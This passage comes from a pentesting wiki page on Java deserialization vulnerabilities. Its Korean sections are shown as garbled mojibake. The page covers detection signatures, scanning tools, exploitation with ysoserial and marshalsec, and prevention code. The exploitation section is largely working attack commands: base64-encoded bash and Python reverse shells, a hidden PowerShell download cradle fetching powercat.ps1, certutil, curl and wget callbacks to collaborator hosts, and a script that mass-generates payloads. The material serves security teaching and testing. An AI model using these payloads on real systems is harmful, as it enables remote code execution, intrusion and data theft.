* ì´ì „ ì••ì¶•ì„ ë‚˜íƒ€ë‚´ëŠ” 16ì§„ìˆ˜ íŒ¨í„´: `1F 8B 08 00`.
* ì´ì „ ì••ì¶•ì„ ë‚˜íƒ€ë‚´ëŠ” Base64 íŒ¨í„´: `H4sIA`.
* `.faces` í™•ì¥ìë¥¼ ê°€ì§„ ì›¹ íŒŒì¼ê³¼ `faces.ViewState` ë§¤ê°œë³€ìˆ˜. ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì´ëŸ¬í•œ íŒ¨í„´ì„ ë°œê²¬í•˜ë©´ [Java JSF ViewState ì—­ì§ë ¬í™”ì— ëŒ€í•œ ê²Œì‹œë¬¼](java-jsf-viewstate-.faces-deserialization.md)ì—ì„œ ìì„¸íˆ ì„¤ëª…ëœ ëŒ€ë¡œ ê²€í† í•´ì•¼ í•©ë‹ˆë‹¤.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### ì·¨ì•½ì  í™•ì¸

**Java Deserialized exploitê°€ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë°°ìš°ê³  ì‹¶ë‹¤ë©´** [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), ë° [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ë¥¼ ì‚´í´ë³´ì•„ì•¼ í•©ë‹ˆë‹¤.

#### í™”ì´íŠ¸ ë°•ìŠ¤ í…ŒìŠ¤íŠ¸

ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **check all the libraries** known to be vulnerable and that [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

#### ë¸”ë™ ë°•ìŠ¤ í…ŒìŠ¤íŠ¸

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` deserializations**.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** vulns from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**ì§ë ¬í™” í…ŒìŠ¤íŠ¸**

Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to **change the data inside the serialized object and bypass some checks** (maybe grant you admin privileges inside a webapp).\
If you find a java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Knowing which data are you sending would be easier to modify it and bypass some checks.

### **ìµìŠ¤í”Œë¡œì‡**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ Windowsì™€ Linuxì— ëŒ€í•œ **ëª¨ë“  ê°€ëŠ¥í•œ ì½”ë“œ ì‹¤í–‰** í˜ì´ë¡œë“œë¥¼ ìƒì„±í•œ ë‹¤ìŒ ì·¨ì•½í•œ ì›¹ í˜ì´ì§€ì—ì„œ í…ŒìŠ¤íŠ¸í•´ ë³´ì„¸ìš”:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

You can **use** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **along with ysoserial to create more exploits**. More information about this tool in the **slides of the talk** where the tool was presented: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)ëŠ” Javaì—ì„œ ë‹¤ì–‘í•œ **Json** ë° **Yml** ì§ë ¬í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
In order to compile the project I needed to **add** this **dependencies** to `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenì„ ì„¤ì¹˜**í•˜ê³  **í”„ë¡œì íŠ¸ë¥¼ ì»´íŒŒì¼**í•©ë‹ˆë‹¤:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ì´ Java JSON ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•´ ë” ì•Œì•„ë³´ì„¸ìš”: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* ysoserial í˜ì´ë¡œë“œë¥¼ í…ŒìŠ¤íŠ¸í•˜ê³  ì‹¶ë‹¤ë©´ **ì´ ì›¹ì•±ì„ ì‹¤í–‰í•˜ì„¸ìš”**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

JavaëŠ” ë‹¤ì–‘í•œ ëª©ì ì„ ìœ„í•´ ë§ì€ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:

* **HTTP ìš”ì²­**: ì§ë ¬í™”ëŠ” ë§¤ê°œë³€ìˆ˜, ViewState, ì¿ í‚¤ ë“±ì˜ ê´€ë¦¬ë¥¼ ìœ„í•´ ë„ë¦¬ ì‚¬ìš©ë©ë‹ˆë‹¤.
* **RMI (ì›ê²© ë©”ì„œë“œ í˜¸ì¶œ)**: Java RMI í”„ë¡œí† ì½œì€ ì§ë ¬í™”ì— ì „ì ìœ¼ë¡œ ì˜ì¡´í•˜ë©°, Java ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì›ê²© í†µì‹ ì˜ ì´ˆì„ì…ë‹ˆë‹¤.
* **HTTPë¥¼ í†µí•œ RMI**: ì´ ë°©ë²•ì€ Java ê¸°ë°˜ì˜ ë‘êº¼ìš´ í´ë¼ì´ì–¸íŠ¸ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë©°, ëª¨ë“  ê°ì²´ í†µì‹ ì— ì§ë ¬í™”ë¥¼ í™œìš©í•©ë‹ˆë‹¤.
* **JMX (Java ê´€ë¦¬ í™•ì¥)**: JMXëŠ” ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ê°ì²´ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
* **ì‚¬ìš©ì ì •ì˜ í”„ë¡œí† ì½œ**: Javaì—ì„œëŠ” í‘œì¤€ ê´€í–‰ìœ¼ë¡œ ì›ì‹œ Java ê°ì²´ì˜ ì „ì†¡ì´ í¬í•¨ë˜ë©°, ì´ëŠ” í–¥í›„ ìµìŠ¤í”Œë¡œì‡ ì˜ˆì œì—ì„œ ì‹œì—°ë  ê²ƒì…ë‹ˆë‹¤.

### Prevention

#### Transient objects

`Serializable`ì„ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤ëŠ” ì§ë ¬í™”ë˜ì§€ ì•Šì•„ì•¼ í•˜ëŠ” í´ë˜ìŠ¤ ë‚´ë¶€ì˜ ê°ì²´ë¥¼ `transient`ë¡œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializableì„ êµ¬í˜„í•´ì•¼ í•˜ëŠ” í´ë˜ìŠ¤ì˜ ì§ë ¬í™”ë¥¼ í”¼í•˜ì‹­ì‹œì˜¤

íŠ¹ì • **ê°ì²´ê°€ í´ë˜ìŠ¤ ê³„ì¸µ êµ¬ì¡°ë¡œ ì¸í•´ `Serializable`** ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì˜ë„í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ì˜ ìœ„í—˜ì´ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´, ì•„ë˜ì™€ ê°™ì´ í•­ìƒ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ëŠ” `final` `readObject()` ë©”ì„œë“œë¥¼ ì •ì˜í•˜ì—¬ ì´ëŸ¬í•œ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë˜ì§€ ì•Šë„ë¡ í•˜ì‹­ì‹œì˜¤:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaì—ì„œ ì—­ì§ë ¬í™” ë³´ì•ˆ ê°•í™”í•˜ê¸°**

**`java.io.ObjectInputStream` ì‚¬ìš©ì ì •ì˜**ëŠ” ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•œ ì‹¤ìš©ì ì¸ ì ‘ê·¼ ë°©ì‹ì…ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì€ ê²½ìš°ì— ì í•©í•©ë‹ˆë‹¤:

* ì—­ì§ë ¬í™” ì½”ë“œê°€ ê·€í•˜ì˜ ì œì–´ í•˜ì— ìˆì„ ë•Œ.
* ì—­ì§ë ¬í™”ì— ì˜ˆìƒë˜ëŠ” í´ë˜ìŠ¤ê°€ ì•Œë ¤ì ¸ ìˆì„ ë•Œ.

**`resolveClass()`** ë©”ì„œë“œë¥¼ ì¬ì •ì˜í•˜ì—¬ í—ˆìš©ëœ í´ë˜ìŠ¤ë§Œ ì—­ì§ë ¬í™”ë˜ë„ë¡ ì œí•œí•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ `Bicycle` í´ë˜ìŠ¤ë§Œ ì—­ì§ë ¬í™”ë˜ë„ë¡ ëª…ì‹œì ìœ¼ë¡œ í—ˆìš©ëœ í´ë˜ìŠ¤ë¥¼ ì œì™¸í•œ ëª¨ë“  í´ë˜ìŠ¤ì˜ ì—­ì§ë ¬í™”ë¥¼ ë°©ì§€í•©ë‹ˆë‹¤:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ë³´ì•ˆ ê°•í™”ë¥¼ ìœ„í•œ Java ì—ì´ì „íŠ¸ ì‚¬ìš©**ì€ ì½”ë“œ ìˆ˜ì •ì„ í•  ìˆ˜ ì—†ì„ ë•Œ ëŒ€ì²´ ì†”ë£¨ì…˜ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì£¼ë¡œ **ìœ í•´í•œ í´ë˜ìŠ¤ ë¸”ë™ë¦¬ìŠ¤íŠ¸**ì— ì ìš©ë˜ë©°, JVM ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:
```
-javaagent:name-of-agent.jar
```
ë™ì ìœ¼ë¡œ ì—­ì§ë ¬í™”ë¥¼ ì•ˆì „í•˜ê²Œ í•˜ëŠ” ë°©ë²•ì„ ì œê³µí•˜ë©°, ì¦‰ê°ì ì¸ ì½”ë“œ ë³€ê²½ì´ ë¹„í˜„ì‹¤ì ì¸ í™˜ê²½ì— ì´ìƒì ì…ë‹ˆë‹¤.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)ì—ì„œ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”.

**ì§ë ¬í™” í•„í„° êµ¬í˜„**: Java 9ëŠ” **`ObjectInputFilter`** ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ì§ë ¬í™” í•„í„°ë¥¼ ë„ì…í•˜ì—¬, ì—­ì§ë ¬í™”ë˜ê¸° ì „ì— ì§ë ¬í™”ëœ ê°ì²´ê°€ ì¶©ì¡±í•´ì•¼ í•˜ëŠ” ê¸°ì¤€ì„ ì§€ì •í•˜ëŠ” ê°•ë ¥í•œ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ í•„í„°ëŠ” ì „ì—­ì ìœ¼ë¡œ ë˜ëŠ” ìŠ¤íŠ¸ë¦¼ë³„ë¡œ ì ìš©í•  ìˆ˜ ìˆì–´ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•œ ì„¸ë°€í•œ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ì§ë ¬í™” í•„í„°ë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ ëª¨ë“  ì—­ì§ë ¬í™” ì‘ì—…ì— ì ìš©ë˜ëŠ” ì „ì—­ í•„í„°ë¥¼ ì„¤ì •í•˜ê±°ë‚˜ íŠ¹ì • ìŠ¤íŠ¸ë¦¼ì— ëŒ€í•´ ë™ì ìœ¼ë¡œ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™œìš©í•œ ë³´ì•ˆ ê°•í™”**: **NotSoSerial**, **jdeserialize**, **Kryo**ì™€ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” Java ì—­ì§ë ¬í™”ë¥¼ ì œì–´í•˜ê³  ëª¨ë‹ˆí„°ë§í•˜ê¸° ìœ„í•œ ê³ ê¸‰ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í´ë˜ìŠ¤ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë˜ëŠ” ë¸”ë™ë¦¬ìŠ¤íŠ¸ ì‘ì„±, ì—­ì§ë ¬í™” ì „ì— ì§ë ¬í™”ëœ ê°ì²´ ë¶„ì„, ì‚¬ìš©ì ì •ì˜ ì§ë ¬í™” ì „ëµ êµ¬í˜„ê³¼ ê°™ì€ ì¶”ê°€ ë³´ì•ˆ ê³„ì¸µì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **NotSoSerial**ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œì˜ ì‹¤í–‰ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ê°€ë¡œì±•ë‹ˆë‹¤.
* **jdeserialize**ëŠ” ì—­ì§ë ¬í™” ì—†ì´ ì§ë ¬í™”ëœ Java ê°ì²´ë¥¼ ë¶„ì„í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ì ì¬ì ìœ¼ë¡œ ì•…ì˜ì ì¸ ì½˜í…ì¸ ë¥¼ ì‹ë³„í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.
* **Kryo**ëŠ” ì†ë„ì™€ íš¨ìœ¨ì„±ì„ ê°•ì¡°í•˜ëŠ” ëŒ€ì²´ ì§ë ¬í™” í”„ë ˆì„ì›Œí¬ë¡œ, ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆëŠ” êµ¬ì„± ê°€ëŠ¥í•œ ì§ë ¬í™” ì „ëµì„ ì œê³µí•©ë‹ˆë‹¤.

### ì°¸ê³  ë¬¸í—Œ

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ì—­ì§ë ¬í™” ë° ysoserial ê°•ì—°: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* gadgetinspectorì— ëŒ€í•œ ê°•ì—°: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ë° ìŠ¬ë¼ì´ë“œ: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec ë…¼ë¬¸: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java ë° .Net JSON ì—­ì§ë ¬í™” **ë…¼ë¬¸:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ê°•ì—°: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ì—­ì§ë ¬í™” CVE: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI ì¸ì ì…˜ ë° log4Shell

**JNDI ì¸ì ì…˜ì´ë€ ë¬´ì—‡ì¸ì§€, RMI, CORBA ë° LDAPë¥¼ í†µí•´ ì´ë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•, log4shellì„ ì´ìš©í•œ ê³µê²© ë°©ë²•**ì— ëŒ€í•œ ë‚´ìš©ì€ ë‹¤ìŒ í˜ì´ì§€ì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java ë©”ì‹œì§€ ì„œë¹„ìŠ¤

